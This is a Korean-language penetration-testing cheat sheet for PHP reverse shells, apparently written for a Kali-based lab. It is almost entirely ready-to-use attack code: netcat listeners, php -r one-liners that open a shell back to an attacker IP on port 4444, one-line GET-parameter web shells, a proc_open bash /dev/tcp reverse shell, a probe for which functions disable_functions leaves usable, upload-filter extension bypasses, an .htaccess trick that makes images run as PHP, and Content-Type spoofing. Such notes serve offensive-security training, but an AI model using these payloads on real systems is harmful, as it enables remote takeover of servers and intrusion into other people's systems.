# php

# 리버스쉘 — PHP

---

## 리스너

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444
```

---

## 기본 (커맨드라인)

```bash
php -r '$sock=fsockopen("<칼리IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 함수 대안 (exec 막혀있을 때 순서대로 시도)

```bash
php -r '$s=fsockopen("<칼리IP>",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<칼리IP>",4444);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<칼리IP>",4444);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<칼리IP>",4444);popen("/bin/sh -i <&3 >&3 2>&3","r");'
```

---

## pentestmonkey 표준 웹쉘 파일 (파일 업로드 시 사용)

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# 파일 내부에서:
# $ip = '<칼리IP>';
# $port = 4444;
# 수정 후 업로드
```

---

## 간단한 웹쉘

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo `$_GET['cmd']`; ?>
```

```bash
# 사용
http://<IP>/shell.php?cmd=id
http://<IP>/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<칼리IP>/4444+0>%261'
```

---

## proc_open (exec/system 전부 막혔을 때)

```php
<?php
$descriptorspec = [
    0 => ["pipe", "r"],
    1 => ["pipe", "w"],
    2 => ["pipe", "w"]
];
$process = proc_open(
    "bash -c 'bash -i >& /dev/tcp/<칼리IP>/4444 0>&1'",
    $descriptorspec,
    $pipes
);
?>
```

---

## disable_functions 우회 — 실행 가능 함수 자동 탐지

```php
<?php
$funcs = ['system','exec','shell_exec','passthru','popen','proc_open'];
foreach ($funcs as $f) {
    if (function_exists($f) && !in_array($f, explode(',', ini_get('disable_functions')))) {
        echo "사용 가능:$f\n";
    }
}
?>
```

---

## 파일 업로드 확장자 우회

```
shell.php → 필터 시
shell.php5
shell.phtml
shell.pHp
shell.php.jpg (이중 확장자)
shell.PhP
```

---

## .htaccess 업로드 — 임의 확장자를 PHP로 실행

```
# .htaccess 내용
AddType application/x-httpd-php .jpg .png .txt
```

→ 이후 shell.jpg (PHP 코드 포함) 업로드 시 실행됨

---

## 팁

- `phpinfo()` 페이지에서 `disable_functions` 확인
- exec류 함수가 모두 막혀있으면 `proc_open` 또는 `pcntl_exec` 시도
- 파일 업로드 시 Content-Type도 image/jpeg 등으로 변경하면 필터 우회 가능
- `php://filter` wrapper로 소스코드 읽기 가능 → LFI 참고